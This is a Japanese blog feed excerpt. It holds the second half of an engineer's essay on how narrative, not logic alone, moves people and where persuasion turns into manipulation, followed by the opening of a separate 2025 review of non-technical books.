バイアスの問題だけではない。もっと根深い。私たちは、自分のアイデンティティを守る物語に依存している。「私は論理的な人間だ」という物語。「私は技術力がある」という物語。「私のチームは優秀だ」という物語。これらの物語が脅かされると、私たちは防御に入る。どれだけ論理的に正しい指摘でも、自分の物語を脅かすものは受け入れられない。なぜ依存と呼ぶのか。やめられないからだ。物語を手放すことは、自分を手放すことに感じられる。「私は実は論理的ではなかった」と認めること、それはアイデンティティの崩壊に近い。どれだけ反証を突きつけられても、私たちは自分の物語にしがみつく。論理が正しいかどうかは、もはや関係ない。これは「信じるべきかどうか」の問題ではない。「信じずにいられない」という問題だ。会議室で「それは違う」と言われたとき、私たちは何を守ろうとしているのか。事実を守っているのか、それとも「私は正しい」という物語を守っているのか。正直に言えば、多くの場合は後者だ。だから、論理で人を動かそうとしても失敗する。相手の物語と衝突すれば、相手は論理を聞く前に防御に入る。「この人の言うことは聞きたくない」という状態になる。論理が届く前に、扉が閉まっている。では、どうすればいいのか。相手の物語を攻撃するのではなく、その物語の中に入る。相手が信じたい物語を否定せず、その物語の延長線上に自分の提案を置く。「あなたの論理は間違っている」ではなく、「あなたの考えをさらに進めると、こうなる」と語る。人を動かすとは、相手の物語を書き換えることではない。相手の物語に自分の提案を織り込むことだ。経験談が人を黙らせる理由人を説得するとき、論理だけでは足りない。自分の失敗談を語ることで心を掴むことがある。「とほほエピソード」には不思議な力がある。完璧な論理よりも、不完全な経験談のほうが、人の心に響くことがあるのだ。経験談は再現性が低い。その人固有の文脈でしか成り立たないことも多い。なのに、私たちは経験談に心を動かされる。なぜか。経験談が持つ力を3つに分解してみる。1つ目は、再現性の放棄だ。「これが正解です」ではなく「私はこうだった」と語ることで、聞き手は反論しにくくなる。事実に対しては「それは違う」と言えるが、経験に対しては言えない。2つ目は、思考コストの削減だ。抽象的な理論を理解するより、具体的な経験を追体験するほうが楽だ。聞き手は考えなくても「なるほど」と言える。3つ目は、権威の自動付与だ。「やったことがある人」は、それだけで信頼される。成功者の経験談には、内容を超えた説得力が宿る。しかし、ここに危険がある。「成功者が言うから正しい」という錯覚。これは聞き手の思考停止を招く。経験談が「効きすぎる」とき、何が起きているのか。聞き手は考えることをやめている。語り手の経験を、自分の結論にすり替えている。経験談を聞いた瞬間、聞き手は何を放棄しているのか。批判的思考だ。「本当にそうか」「自分の場合は違うのではないか」という問いを放棄している。経験談には「事実」としての重みがあるから、反論しにくい。反論すると「お前はやったことがないくせに」と言われそうだから、黙ってしまう。「反論できない感じ」は、どこから生まれるのか。経験談は「私はこうだった」という一人称で語られる。一人称の物語に対して、「それは違う」とは言いにくい。他人の経験を否定する権利が自分にあるのか、という遠慮が働く。しかし、その経験から導かれる「だからこうすべきだ」という結論は、本当に正しいのか。そこは検証が必要だ。だから、経験談は入口であって、結論ではない。経験談で心を開き、そこから自分で考える。その順番が重要だ。では、経験が浅い人は物語を語る資格がないのか。私はそうは考えません。経験の浅さには、浅いなりの価値があります。経験が浅いからこそ見えるものがある。「なぜこのやり方なのか」という素朴な疑問。ベテランにとっては「当たり前」になっていることへの違和感。「本当にこれでいいのか」という不安。これらは、経験を積むほど薄れていく。ベテランが失いやすい視点とは何か。初心者の目線だ。「これは難しい」「これはわかりにくい」という感覚は、慣れると消えてしまう。だからベテランが書いたドキュメントは、初心者には読めないことがある。ベテランが設計したシステムは、初心者には使えないことがある。経験は資産だが、同時に負債でもある。「まだわからない」という物語は、どんな力を持つか。謙虚さの力だ。「私はまだ学んでいる途中です」と言える人は、相手の話を聞く姿勢がある。「私は全部わかっています」と言う人は、すでに耳を閉じている。経験の浅さを認めることは、対話の扉を開くことになる。重要なのは経験の量ではなく、経験を物語として語る力だ。10年の経験があっても、それを言葉にできなければ伝わらない。1年の経験でも、そこから何を学んだかを語れれば、人の心に届く。経験談を「入口」に留めるには、何が必要か。聞き手の側には、「この人の経験は参考になるが、自分の状況は違うかもしれない」という留保が必要だ。語り手の側には、「これは私の経験であって、あなたに当てはまるとは限りません」という謙虚さが必要だ。両者がこの姿勢を持っていれば、経験談は入口のまま留まる。物語が許されない領域私はエンジニアとして長く働いてきた。だからこそ言いたいことがある。物語万能論は危険だ。かつて、私は失敗したことがある。プロジェクトが炎上しかけていたとき、チームの士気を上げようと物語を語った。「このプロダクトが世に出れば、多くの人の生活が変わる」「困難を乗り越えた先に、私たちは成長している」。チームは一時的に盛り上がった。でも、テストは通らなかった。本番環境でバグが発生した。物語で人は動いたが、システムは動かなかった。バグは物語で直らない。物語でテストが通るなら、私は今頃、小説家になっている。どれだけ美しい物語を語っても、コードが間違っていれば動かない。どれだけチームが納得しても、テストが通らなければリリースできない。エンジニアリングには、物語では代替できない領域がある。技術的正しさは、どこまで物語と共存できるのか。私の答えは「共存はできるが、置き換えはできない」だ。物語は人を動かすが、システムは論理で動く。この2つを混同してはいけない。泣いたら人は許してくれるかもしれませんがシステムは許してくれません。人の層とシステムの層を混同すると、何が起きるか。人の層で通用する「納得したからOK」が、システムの層に持ち込まれる。チーム全員が「この設計でいこう」と合意しても、コードが間違っていれば動かない。逆に、システムの層で通用する「正しいから従え」が、人の層に持ち込まれる。論理的に正しい設計でも、チームが納得していなければ実装は進まない。「納得したからOK」は、どこまで通用するのか。人を動かすところまでだ。「このアーキテクチャでいこう」という合意形成には物語が必要だ。しかし、そのアーキテクチャが本当に要件を満たすかは、検証が必要だ。納得と正しさは別の問題だ。物語で進めてはいけない判断の特徴は何か。結果が客観的に検証できる判断だ。「このコードは動くか」「このシステムは要件を満たすか」「このセキュリティ対策は十分か」。これらは、どれだけ美しい物語を語っても、実際にテストしなければわからない。物語で「大丈夫だろう」と進めて、本番環境で障害が起きたら、物語は言い訳にしかならない。ナラティブと検証の役割分担を整理しておく。人を動かすのは物語だ。なぜこの技術を選ぶのか、なぜこのアーキテクチャにするのか。それを説明し、納得してもらうには物語が必要だ。正しさを担保するのは論理とテストと記録だ。選んだ技術が本当に動くのか、アーキテクチャが要件を満たすのか。それを確認するには検証が必要だ。「あの人が言うから正しい」という判断は、いつ危険になるのか。それは、検証を省略したときだ。権威ある人の経験談に納得したとしても、コードレビューは必要だ。テストは必要だ。ドキュメントは、物語の代替にはなりえない。物語が「なぜそうするのか」を伝え、ドキュメントが「何をするのか」を記録する。物語は人の層に効き、論理はシステムの層に効く。この使い分けが重要だ。プロジェクトを進めるには「直線モード」と「曲線モード」を行き来する必要があります。計画と合理性を重視する直線モード、そして変化や対話を重視する曲線モード。どちらか一方では足りません。両方を使い分けられることが、プロジェクトを前に進める力になります。優しい物語の罠「あなたらしさを大切にしたうえで、今必要な道具を手に入れ、磨き、使い分けていこう」というメッセージには優しさがある。しかし、優しい物語は、なぜ時に成長を妨げるのか。思い出してほしい。優しい言葉をかけたのに、相手が変わらなかった経験はないか。「大丈夫だよ」と言い続けたのに、問題が解決しなかった経験はないか。あのとき、私たちは何を間違えていたのか。優しさは寄り添う。甘さは目を背けさせる。優しさと甘さは、どこで分岐するのか。私の答えは「事実を直視しているかどうか」だ。優しさは事実を受け止めた上で寄り添うこと。甘さは事実から目を背けさせること。「あなたらしくていい」が「変わらなくていい」に変質したとき、それは優しさではなく甘さになる。厳しさを含まない物語は、誰のためのものか。多くの場合、それは語り手のためだ。相手に嫌われたくない、対立を避けたい、という語り手の願望が、優しさという衣をまとっている。その優しさは、聞き手のためか、語り手のためか。この問いは重要だ。「傷つけたくない」と言いながら、実は「嫌われたくない」だけかもしれない。「今は言わないほうがいい」と言いながら、本当は「言うのが面倒」なだけかもしれない。優しさの仮面をかぶった自己保身は、いくらでもある。事実を和らげることと、隠すことの境界はどこか。私の答えは「相手が判断するために必要な情報を持っているかどうか」だ。「あなたのスキルはまだ足りないが、伸びしろがある」は和らげている。「あなたは素晴らしい」と言って、スキル不足を伝えないのは隠している。前者は事実を含んでいるから、相手は次の行動を選べる。後者は事実を隠しているから、相手は間違った判断をする。成長を促す厳しさと、切り捨ての厳しさはどう違うか。成長を促す厳しさは、相手の可能性を信じている。「あなたならできるはずだ。だから厳しく言う」という姿勢がある。切り捨ての厳しさは、相手を見限っている。「あなたには無理だ。言っても仕方ない」という諦めがある。言葉は同じ「厳しさ」でも、その奥にある信頼の有無で意味が変わる。勇気を与える物語と、逃避を許す物語の違いは何か。勇気を与える物語は「困難があるが、乗り越えられる」と語る。逃避を許す物語は「困難なんてない」と語る。前者は現実を認めた上で希望を示す。後者は現実から目を背けさせる。自分が語っている物語は、どちらだろうか。説得と操作の境界物語には力がある。力があるということは、危険もあるということだ。物語は、どの瞬間に「説得」から「操作」に変わるのか。その境界は曖昧だ。聞き手の自由意志は、どこまで守られているのか。完全に自由な判断などありえない。私たちは常に、何らかの影響を受けながら判断している。では、説得と操作は何が違うのか。結果だけを見れば、どちらも「相手が動いた」という点では同じだ。説得と操作の違いは、「結果」ではなく「過程」にある。結果が同じなら、過程を見なければならない。しかし、過程を見れば違いが見える。説得は、相手が考える余地を残している。操作は、相手が考える余地を奪っている。相手が考える余地を失った瞬間は、いつか。選択肢が1つしか見えなくなったときだ。「これしかない」「こうするしかない」と思わせた瞬間、相手は考えることをやめている。本当は他の選択肢があるのに、それを見せないでおく。これは操作だ。「選択肢を示す」と「結論を誘導する」の違いは何か。選択肢を示すとは、複数の道があることを伝え、それぞれの長所と短所を説明することだ。結論を誘導するとは、複数の道があるように見せながら、1つの道だけが正しいと思わせることだ。言葉は似ているが、相手の思考を尊重しているかどうかで意味が変わる。しかし、だからといって何をしてもいいわけではない。善意で語った物語が、操作になるのはどんなときか。語り手が「相手のため」と信じていても、相手の判断力を奪っていれば操作だ。「あなたのためを思って」という言葉は、しばしば「私の思い通りにしたい」の言い換えになっている。善意は免罪符にならない。語り手の「善意」は、免罪符になりうるか。ならない。善意で語った物語が、相手を誤った方向に導くことはある。「あなたのためを思って」は、操作の常套句だ。善意は動機であって、結果の正当化にはならない。操作に堕ちないための条件を3つ挙げる。1つ目は、事実を歪めないこと。都合のいい事実だけを選んだり、不都合な事実を隠したりしない。2つ目は、相手に考える余地を残すこと。「これしかない」と思わせるのではなく、「こういう選択肢がある」と示す。結論を押し付けない。3つ目は、相手の利益を本当に考えていること。相手を動かすことが目的なのか、相手のためになることが目的なのか。同じ物語でも、動機によって意味が変わる。この3つが揃わなければ、どれだけ巧みな物語も操作に堕する。また、「別の物語を語る」ことが、失敗からの逃避になることもある。プロジェクトが破綻したとき、物語を更新することで責任を回避していないか。失敗の原因を分析し、自分の責任を認めた上で、「次はこうする」という物語を語るのは再解釈だ。事実から目を背け、「本当はうまくいっていた」「環境が悪かった」と言い張るのは言い訳だ。物語は現実を覆い隠すためのものではない。現実を受け止めた上で、次に進むためのものだ。では、物語を使った対話とはどのようなものか。ファシリテーションの現場から考えてみます。対話は物語を揃えることではない優れたファシリテーターは「ほぼ何もしない」といいます。ワークを説明したら、部屋の隅に座る。音楽を流す。ニコニコ笑っている。具体的な動きはそれだけです。でも、それでチームは動く。なぜか。それは、ファシリテーターが「物語の場」を設定しているからだ。メンバーが自分たちで物語を紡げるような空間を作っている。論理的な指示を与えるのではなく、物語が生まれる環境を整えている。しかし、対話とは本当に「物語の共同制作」と言えるのか。正直に言えば、完全に対等な共同制作は難しい。ファシリテーターは場を設計している時点で、ある種の権力を持っている。どんな問いを投げかけるか、どんな発言を拾うか、どこで介入するか。それらすべてが、生まれる物語に影響を与える。「何もしない」という選択自体が、1つの介入なのだ。では、合意されなかった物語はどこへ行くのか。チームで1つの物語を紡いだとき、そこに乗れなかった人がいる。彼らの物語は消えるのか。消えはしない。地下に潜るだけだ。表向きは合意しながら、心の中では別の物語を持ち続ける。優れたファシリテーターは、この「語られなかった物語」にも目を向ける。全員が同じ物語を持つ必要はない。大切なのは、異なる物語が共存できる場を作ることだ。対話のゴールは「1つの物語に収束すること」ではなく「複数の物語が共存できること」だ。合意形成について、よく誤解されていることがある。多くの人は、自分の檻の中から相手の檻を押し潰そうとする。自分の枠組みが正しい、相手の枠組みは間違っている。だから相手を説得し、こちらの檻に入れようとする。でも、それは合意ではない。征服だ。本当の合意形成とは、まず自分が檻の中にいることを認めることから始まる。私にも枠組みがある。相手にも枠組みがある。どちらの檻も、その人の経験と価値観から作られている。どちらが正しいという話ではない。相手の檻を壊す必要はない。自分の檻を捨てる必要もない。大切なのは、お互いの檻の形を理解し、その間に共通の地面を見つけることだ。檻から出るのではなく、檻と檻の間に橋を架ける。それが対話だ。一貫性とは何か複数の物語を使い分けることは、「一貫性の欠如」にならないのか。状況に応じて物語を切り替える人は、信用できないのではないか。そう感じるかもしれません。しかし、一貫性とは何でしょうか。言葉の統一なのか、価値観の統一なのか。私は、一貫性とは価値観の統一だと考えている。言葉が変わっても、芯がぶれなければ、それが一貫性だ。言葉や物語は変わっていい。相手によって、文脈によって、最適な表現は変わる。しかし、その奥にある価値観——何を大切にしているか——は変わらない。物語が変わっても残る「軸」とは何か。それは「この人は結局、何を実現したいのか」という問いへの答えだ。チームの成長を願っているのか。技術的な卓越性を追求しているのか。顧客の幸福を第一にしているのか。その軸がぶれなければ、物語が変わっても芯はぶれない。文脈適応と迎合の違いは、どこで判断できるのか。文脈適応は、相手に届くように表現を変えること。迎合は、相手に合わせて価値観を曲げること。前者は橋を架ける行為であり、後者は自分を売る行為だ。同じ価値観を異なる文脈で語り分けられることこそが、優れたナラティブ構築者の条件だ。論理を使い直すここまで、論理の限界を語ってきた。論理は単体では人を動かさない。論理自体が1つの物語だ。論理を絶対視することの危険。しかし、論理を否定して終わりにするつもりはない。論理を「唯一の正解」から「道具」へ格下げすることは、思考を弱くするのか、強くするのか。私は強くすると考えている。論理を絶対視していると、「論理的に正しいのになぜ伝わらないのか」と悩むことになる。論理を道具として扱えば、「この道具はこの場面では有効か」と考えられる。道具は選べる。使い分けられる。論理という物語が有効な場面と、別の物語が有効な場面を見極められるようになる。プロジェクトには「プロジェクトストーリー」がある。最終ゴールと中間ゴールからストーリーを描き、チームの方向性を示す。このストーリーの中に、論理は組み込まれる。計画は論理的だろう。でも、その計画を人に伝え、人を動かすには、物語という器が必要だ。論理と物語、どちらも選んで使うものです。どちらかが正しいのではありません。どちらをいつ使うかを判断できることが、人を動かす力になります。正しさを振り回すのは、本当に「最後」でいいのかここまで読んで、こう思った人がいるかもしれない。「物語が先で、正しさは後。それはわかった。でも、正しさを最後まで出さないことに、問題はないのか」正しさを最初に出したくなるのは、どんな不安からか。「間違ったことを言いたくない」という不安だ。「後で『それは違う』と言われたくない」という不安だ。正しさを先に出しておけば、自分の立場は守られる。たとえ相手が納得しなくても、「私は正しいことを言った」と言える。正しさを最初に出すことは、自己防衛なのだ。しかし、正しさを最後に出すことで、失われるものはないのか。ある。時間だ。物語で回り道をしている間に、問題は悪化する。緊急事態では、正しさを最初に出すべき場面もある。「このまま進むとシステムが落ちます」と言うべきときに、「まず私の経験を聞いてください」と始めている場合ではない。「最後まで正しさを出さない」こと自体が、別の操作になっていないか。この問いは重要だ。相手が自分で結論に至ったように見せかけて、実は最初から結論が決まっている。正しさを隠しながら誘導している。これは、正しさを振りかざすのとは別の形の操作だ。では、いつ正しさを出すべきか。私の答えは「相手の安全が脅かされるとき」と「時間の制約があるとき」だ。相手が危険な判断をしようとしているとき、物語を語っている余裕はない。「それは間違っている」と言うべきだ。締め切りが迫っているとき、回り道をしている余裕はない。「正しい方法はこれです」と言うべきだ。正しさは武器だ。武器を振り回すのは危険だが、武器を持たないのも危険だ。大切なのは、いつ抜くかを見極めることだ。syu-m-5151.hatenablog.comおい、物語を語れだから、私は言いたい。おい、物語を語れ。論理的であろうとするな、とは言いません。論理は大事です。でも、論理だけでは人は動きません。「この設計が正しい理由は〜」と説明するとき、あなたは本当に論理だけで話しているだろうか。実は、相手が納得しやすい順番で、相手が受け入れやすい言葉で、相手の不安を先回りして解消しながら話しているのではないか。それは物語を語っているということだ。世間で「論理的」と言われる人の正体は、巧みなナラティブ構築者だ。彼らは論理を使いこなしているのではない。論理という道具を使って、説得力のある物語を紡いでいるのだ。そして、そのことに自覚的になることで、私たちはより良い物語の語り手になれる。物語を語る勇気でも、物語を語るのは怖い。論理的であろうとするのは、ある意味で楽です。「これはデータに基づいています」「これは事実です」と言えば、自分の主観を隠せます。責任を回避できます。でも物語を語るということは、自分をさらけ出すことだ。裸になることだ。「私はこう思う」「私はこれを大事にしている」「私はこの未来を信じている」と言わなければならない。自分の背景を伝えること、自分の失敗を語ること、自分の葛藤を見せること。それは勇気がいる。でも、その勇気が人を動かす。「論理的に正しいから」ではなく、「この人が言うなら」で人は動く。そして「この人が言うなら」を引き出すのは、論理ではなく、物語だ。おわりに年の瀬の日曜日の夜、私はベッドの上でこの文章を書き終えようとしている。正直に言えば、書いている間も何度か「これは論理的に正しいのか」と自問してしまった。物語の力を語りながら、論理の正しさを気にしている。滑稽だ。滑稽だが、それが私という人間なのだと思う。この文章を書いたからといって、明日から完璧に物語を語れるようになるわけではない。おそらくこれからも、会議室で正論を並べ立て、微妙な沈黙を招く日があるだろう。「なぜ伝わらないのだ」と、帰りの電車で思い悩む日があるだろう。だが、少しだけ違うことがある。以前の私は、伝わらないとき、「もっと論理的に説明しなければ」と考えていた。今は違う。「ああ、骨だけを見せていた」と気づくことができる。気づいたなら、肉を足せばいい。失敗談をひとつ、付け加えればいい。それだけでも、以前よりはましなのだと思う。たぶん。明日は月曜日だ。また会議がある。また正論を振りかざしたくなる瞬間がある。だが今度は、最初に自分の失敗談から話してみようと思う。「この設計が正しい理由は」ではなく、「以前、似たような判断を先送りにして、半年後に全員で苦しんだことがある」から始めてみる。怖い。裸を晒すようで、怖い。だが、論理だけで人が動くと信じていた私は、もういない。あの金曜日のエレベーターの中で、その私は死んだのだと思います。おい、物語を語れ。何度でも、自分に言い聞かせる。何度でも忘れ、何度でも思い出す。完璧に語れるようになることより、何度でも思い出せることのほうが、きっと大切なのだ。参考文献イン・ザ・メガチャーチ (日本経済新聞出版)作者:朝井リョウ日経BPAmazon小説作者:野崎まど講談社Amazon言語化するための小説思考作者:小川 哲講談社Amazonリーダーのためのストーリーテリング入門 90秒で人の心を動かす「語り」のマネジメントスキル作者:広江 朋紀翔泳社Amazonリーダーのための！　ファシリテーションスキル作者:谷 益美すばる舎Amazonチームビルディングと組織開発の話作者:長尾 彰ナガオ考務店Amazonチーム・ビルディング[新版]　人と人を「つなぐ」技法作者:堀公俊日経BPAmazon他者と働く──「わかりあえなさ」から始める組織論 (NewsPicksパブリッシング)作者:宇田川元一ニューズピックスAmazon組織が変わる――行き詰まりから一歩抜け出す対話の方法2 on 2作者:宇田川 元一ダイヤモンド社Amazonスタッフエンジニア　マネジメントを超えるリーダーシップ作者:Will Larson日経BPAmazonスタッフエンジニアの道 ―優れた技術専門職になるためのガイド作者:Tanya Reillyオーム社Amazonエンジニアリングが好きな私たちのための　エンジニアリングマネジャー入門作者:サラ・ドラスナー日本能率協会マネジメントセンターAmazon企業変革のジレンマ 「構造的無能化」はなぜ起きるのか作者:宇田川元一日経BPAmazonナラティブ経済学―経済予測の全く新しい考え方作者:ロバート・シラー東洋経済新報社Amazon世界はナラティブでできている：なぜ物語思考が重要なのか作者:アンガス フレッチャー青土社Amazonストーリーが世界を滅ぼす―物語があなたの脳を操作する作者:ジョナサン・ゴットシャル東洋経済新報社Amazon「わかってもらう」ということ　他人と、そして自分とうまくやっていくための言葉の使い方 (単行本)作者:川添 愛KADOKAWAAmazonなぜあなたはマネジメントを間違えるのか？　会社の常識を打ち破るチェンジリーダーの教科書作者:岸良裕司KADOKAWAAmazon部下をもったらいちばん最初に読む本作者:橋本拓也アチーブメント出版Amazon人が壊れるマネジメントプロジェクトを始める前に知っておきたいアンチパターン 50作者:橋本将功ソシムAmazonモチベーション革命　稼ぐために働きたくない世代の解体書 (NewsPicks Book)作者:尾原和啓幻冬舎Amazon「変化を嫌う人」を動かす:魅力的な提案が受け入れられない4つの理由作者:ロレン・ノードグレン,デイヴィッド・ションタル,船木 謙一(監修)草思社Amazon","isoDate":"2025-12-29T07:07:46.000Z","dateMiliSeconds":1766992066000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"4年目セキュリティエンジニアの2025年振り返り & AIから見た今年の私","link":"https://www.rowicy.com/blog/review-2025-riiim/","contentSnippet":"新卒からエンジニアとして4年経とうとする中で、2025年の振り返りをやっていこうと思います","isoDate":"2025-12-29T00:00:00.000Z","dateMiliSeconds":1766966400000,"authorName":"riiim","authorId":"riiim"},{"title":"2025年 俺が愛した本たち 非技術書編","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/28/115033","contentSnippet":"はじめに技術書編を書き終えて、ふと気づいた。あれだけ書いても、まだ語っていない本がある。仕事に直結しない本。読んでも生産性が上がらない本。キャリアに役立つかどうかわからない本。そういう本たちのことを、どこかで書きたいと思っていた。だから、この記事を書いている。非技術書を読む時間を、どこか後ろめたく感じていた時期があった。エンジニアなんだから技術書を読むべきだ。限られた時間を、仕事に関係ない本に使っていいのか。そんな自問が、頭の片隅にあった。でも、ある時期から考えが変わった。技術書だけ読んでいると、技術書が読めなくなる。視野が狭くなる。発想が硬くなる。同じ問題を、同じ角度からしか見られなくなる。なぜそうなるのか。技術書は「答え」を求めて読むからだ。設計パターン、ベストプラクティス、トラブルシューティング。明確な課題があって、その解決策を探している。でも非技術書は違う。何を得られるかわからないまま読み始める。読み終わっても、何が残ったのかすぐにはわからない。数ヶ月後、ふとした瞬間に「ああ、あの本のあれか」と腑に落ちることがある。即効性がないから、効いている実感もない。でも、確実に何かが変わっている。では、非技術書は仕事に無関係かというと、そうでもない。小説を読む。エッセイを読む。哲学書を読む。歴史書を読む。どれも仕事には直結しない。でも、人間を理解しようとする営みは、チームで働く上で無駄ではないはずだ。コードを書くのは人間だ。レビューするのも人間だ。障害対応で慌てるのも、成功を喜ぶのも、人間だ。技術だけ理解しても、人間を理解していなければ、良いエンジニアにはなれない。そう言い聞かせながら、非技術書を読んできた。ここまで書いて、自分でも気づいている。これは言い訳だ。正直に言えば、読んでいて楽しいから読んでいる。それだけだ。仕事のためとか、自己成長のためとか、そういう大義名分は後付けだ。ページをめくる時間が好きだ。知らない世界に触れる瞬間が好きだ。登場人物の感情に揺さぶられる体験が好きだ。好きなことに理由はいらない。でも、理由を語りたくなるのが人間だ。断っておくと、以下の選定基準はかなりブレている。読んだ直後に評価したわけではなく、年末に一年を振り返って「良かったな」と思い出した本を並べているだけだ。印象に残った理由も、内容が深かったからだったり、読んだタイミングが良かったからだったり、装丁が好みだったからだったり、バラバラだ。体系的なブックガイドではない。ある一人のエンジニアが、2025年に出会って心に残った本の記録だと思ってほしい。以下に紹介する本たちは、2025年に私の心を動かした非技術書だ。仕事に役立つかどうかはわからない。キャリアに影響したかどうかもわからない。ただ、これらの本と過ごした時間が、私の2025年を少しだけ豊かにしてくれた。それだけは確かなことだ。昨年以前に紹介した本2022年 俺が愛した本たち 技術書編 - じゃあ、おうちで学べる2023年 俺が愛した本たち 技術書編 - じゃあ、おうちで学べる2023年 俺が愛した本たち 非技術書編 - じゃあ、おうちで学べる2024年 俺が愛した本たち 技術書編 - じゃあ、おうちで学べる2024年 俺が愛した本たち 非技術書編(物語を除く) - じゃあ、おうちで学べる2025年 俺が愛した本たち 技術書編 - じゃあ、おうちで学べる2025年 俺が愛した本たち 非技術書編 - じゃあ、おうちで学べるまずは小説から始めよう。物語の力を信じているから。小説野崎まどという作家は、読者の予測を裏切ることに喜びを見出しているとしか思えない。タイトルが『小説』。これ以上ないほど直球で、それでいて挑発的だ。読み始めたときは、ただの青春小説かと思った。でも違った。「小説とは何か」という問いに正面から向き合いながら、それ自体が1つの「小説」として成立している。メタ構造に気づいた瞬間、鳥肌が立った。野崎まどの作品は、読み終わった後に「やられた」と思わせる仕掛けが必ずある。『know』では知識と情報の本質を、『タイタン』ではAIと人間の関係を問いかけてきた。本作では、小説という形式そのものを問いかけてくる。読んでいる間は物語に没入し、読み終わった後に構造の巧みさに気づく。その二重の楽しみが、野崎作品の醍醐味だ。小説作者:野崎まど講談社AmazonGOATデジタル全盛の時代に、あえて紙の文芸誌を立ち上げる。その挑戦に心を動かされた。510円という価格設定で、特殊紙を惜しみなく使い、読書バリアフリーにも取り組んでいる。翻訳の仕事をしているとよく分かるが、紙代も印刷代も高騰している。書籍全体の価格が年々上がっているのは、出版社の怠慢ではない。本を作るコストそのものが上がっている。そんな中で、この価格で、この品質を維持しようとしている。すごいな、と素直に思った。GOAT作者:西加奈子,小川哲,尾崎世界観,市川沙央,チョン・セラン小学館AmazonGOAT Summer 2025作者:朝井リョウ,一穂ミチ,野崎まど小学館Amazon野崎まどの「山羊と七枚」も掲載されており、雑誌のコンセプトと作家の個性が見事に噛み合っていた。dps.shogakukan.co.jp小説と雑誌を読んで、ふと考えた。読む時間は有限だ。何を読むかより、どう読むかが問われる。そこで手に取ったのが、この本だった。STOIC 人生の教科書ストイシズム2000年以上前から続くストア哲学が、シリコンバレーで再び注目されている。禅やマインドフルネスと並んで、ビジネスパーソンの必須教養になりつつあるという。本書は、エピクテトス、セネカ、マルクス・アウレリウスという三人のストア哲学者の言葉をもとに、90日間のプログラムとして構成されている。見開き2ページで1つの教えを学び、実践するという形式だ。ストイシズムの核心は「他人の行動はコントロールできないが、自分の反応はコントロールできる」という考え方にある。これは現代のエンジニアにとっても響く教えだ。障害が起きたとき、顧客からのクレームが来たとき、チームメンバーとの意見が対立したとき。制御できないことに怒りを感じても何も変わらない。変えられるのは、自分がどう対応するかだけだ。本書で繰り返し語られる4つの美徳がある。知恵（うわべにとらわれない力）、正義（他人に思いやりを持つ力）、勇気（苦難に立ち向かう力）、節制（衝動を抑える力）。どれも派手ではないが、日々の仕事で試される場面ばかりだ。佐藤優氏が帯で「大きな理想を獲得するには禁欲が必要だ」と書いている。逆説的だが、自分を律することで自由になれる。そういう考え方に惹かれる人は多いはずだ。STOIC 人生の教科書ストイシズム作者:ブリタニー・ポラットダイヤモンド社Amazonストイシズムは「衝動を抑える力」を説く。では、そもそも私たちは何を読み取っているのか。読むという行為そのものを問い直す本に出会った。読めば分かるは当たり前？　――読解力の認知心理学「読めば分かる」は当たり前ではない。本書を読んで、その事実に改めて気づかされた。文字を認識し、単語の意味を理解し、文の構造を解析し、文章全体の意味を把握する。私たちが無意識に行っているこの作業は、驚くほど複雑な認知プロセスの連続だ。どこかでつまずくと、読解は破綻する。そして、つまずきのポイントは人によって異なる。本書では、読解を3つの目的地に分類している。「表象構築」（テキストの内容を正確に理解する）、「心を動かす読解」（物語に感情移入する）、「批判的読解」（内容を吟味し、自分の考えと照らし合わせる）。技術書を読むときは主に表象構築を、小説を読むときは心を動かす読解を使っている。無意識に使い分けていたことを、言語化してもらった気分だ。特に響いたのは、「ワーキングメモリ」の話だ。複雑な文章を読むとき、頭の中の「メモ帳」に情報を一時保存しながら読み進める。このメモ帳には容量制限がある。だから、込み入った技術ドキュメントを読むときは、メモを取りながら読むほうが理解が深まる。経験則として知っていたことに、認知科学的な裏付けを得た。読めば分かるは当たり前？　――読解力の認知心理学 (ちくまプリマー新書)作者:犬塚美輪筑摩書房Amazon小澤隆生 凡人の事業論 天才じゃない僕らが成功するためにやるべき驚くほどシンプルなこと孫正義と三木谷浩史。日本を代表する二人の天才経営者に仕えてきた人物がいる。楽天イーグルス創業、PayPay立ち上げなど、巨大ビジネスを次々と成功させてきた小澤隆生氏だ。投資先19社中11社が株式上場という実績を持つ。そんな人物が「自分は凡人だ」と言う。謙遜ではない。天才のそばにいたからこそ、自分との違いを痛感してきたのだろう。本書で語られるフレームワークは驚くほどシンプルだ。「センターピン」を見極める。「根源的欲求」に訴える。「打ち出し角度」を検証する。言葉は平易だが、1つ一つのやりきり度が違う。市場を選ぶときは「成長性」と「シェア率」で判断する。チームを動かすときは数字目標ではなく、ワクワクする言葉で語る。精神論ではなく、再現可能な方法論として事業の作り方を説いている。心に刺さったのは「しつこい人間が最後は残る」という言葉だ。才能や運ではなく、諦めずに続けること。天才たちの隣で勝ち残ってきた人が言うと、重みが違う。エンジニアとして新しいプロジェクトを立ち上げるとき、この本を思い出すことになりそうだ。小澤隆生 凡人の事業論――天才じゃない僕らが成功するためにやるべき驚くほどシンプルなこと作者:蛯谷 敏ダイヤモンド社Amazon失敗できる組織「失敗は成功の母」という言葉を、私たちは使いすぎている。エイミー・エドモンドソンはこの使い古された格言に、鋭いメスを入れる。すべての失敗が成功につながるわけではない。失敗には種類がある。それを見分けられなければ、失敗から学ぶことはできない。本書は『恐れのない組織』で「心理的安全性」を提唱した著者が、失敗の科学に正面から取り組んだ一冊だ。フィナンシャル・タイムズの「ビジネス・ブック・オブ・ザ・イヤー2023」を受賞している。本書で示される失敗の3分類が明快だ。「基本的失敗」は、注意不足や経験不足による防げたはずの失敗。「複雑な失敗」は、システムの複雑さゆえに発生する、完全には避けられない失敗。そして「賢い失敗」は、未知の領域に挑戦する過程で必然的に起きる、学びをもたらす失敗。問題は、私たちが3つを区別せずに「失敗」とひとくくりにしてしまうことだ。エンジニアとして考えると、本番障害を起こしたとき、それが「基本的失敗」なのか「複雑な失敗」なのか「賢い失敗」なのかで、対応は変わる。テスト不足なら基本的失敗。想定外の負荷パターンなら複雑な失敗。新しいアーキテクチャを試した結果なら賢い失敗。ポストモーテムで原因を分類することで、再発防止策の質が変わる。本書は、失敗を恐れるなと言っているのではない。失敗を理解せよと言っている。失敗できる組織作者:エイミー C エドモンドソン早川書房Amazon知性の罠　